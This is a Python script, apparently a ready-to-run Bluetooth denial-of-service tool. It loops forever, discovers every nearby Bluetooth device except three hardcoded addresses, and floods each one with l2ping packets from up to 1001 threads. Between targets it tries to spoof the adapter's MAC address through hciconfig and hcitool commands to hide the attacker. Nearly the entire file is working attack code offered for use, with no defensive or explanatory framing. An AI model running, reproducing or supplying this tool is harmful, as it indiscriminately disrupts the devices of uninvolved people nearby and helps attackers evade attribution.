import os
import random
import bluetooth
import time
import threading

# List of MAC addresses to exclude
excluded_macs = ["F4:4E:FD:F0:B0:40", "CD:8D:3E:22:9A:1B", "11:75:58:A6:4A:0C"]

# Function to perform a DOS attack
def DOS(target_addr, packages_size):
    # Generate a new MAC address
    new_mac = [0x00, 0x16, 0x3e, random.randint(0x00, 0x7f), 
               random.randint(0x00, 0xff), random.randint(0x00, 0xff)]
    new_mac_str = ':'.join('%02x' % b for b in new_mac)
    # Change the MAC address using hcitool
    os.system(f'sudo hciconfig hci0 down')
    os.system(f'sudo hciconfig hci0 reset')
    os.system(f'sudo hciconfig hci0 up')
    os.system(f'sudo hcitool -i hci0 cmd 0x03 0x0005 {new_mac[0]:02X} {new_mac[1]:02X} {new_mac[2]:02X} {new_mac[3]:02X} {new_mac[4]:02X} {new_mac[5]:02X}')
    # Perform the DOS attack
    os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)

# Loop for evermore
while True:
    # Discover nearby Bluetooth devices
    nearby_devices = bluetooth.discover_devices()

    # Loop through the nearby devices
    for mac_address in nearby_devices:
        # Check if the MAC address is in the excluded list
        if mac_address in excluded_macs:
            continue

        # Perform a DOS attack on the device
        for i in range(0, 1001):
            try:
                print(f"Performing DOS attack on device: {mac_address}. Attempt {i}")
                threading.Thread(target=DOS, args=[str(mac_address), 100]).start()
                time.sleep(0.1)  # Wait for 100ms before starting the next thread
            except:
                # Failed to perform the DOS attack
                if i == 1000:
                    print(f"Failed to perform DOS attack on device: {mac_address}")
                else:
                    print(f"Failed to perform DOS attack on device: {mac_address}. Retrying... Attempt {i}")

        # Generate a new MAC address
        new_mac = [0x00, 0x16, 0x3e, random.randint(0x00, 0x7f), 
                   random.randint(0x00, 0xff), random.randint(0x00, 0xff)]
        new_mac_str = ':'.join('%02x' % b for b in new_mac)
        # Change the MAC address using hcitool
        os.system(f'sudo hciconfig hci0 down')
        os.system(f'sudo hciconfig hci0 reset')
        os.system(f'sudo hciconfig hci0 up')
        os.system(f'sudo hcitool -i hci0 cmd 0x03 0x0005 {new_mac[0]:02X} {new_mac[1]:02X} {new_mac[2]:02X} {new_mac[3]:02X} {new_mac[4]:02X} {new_mac[5]:02X}')
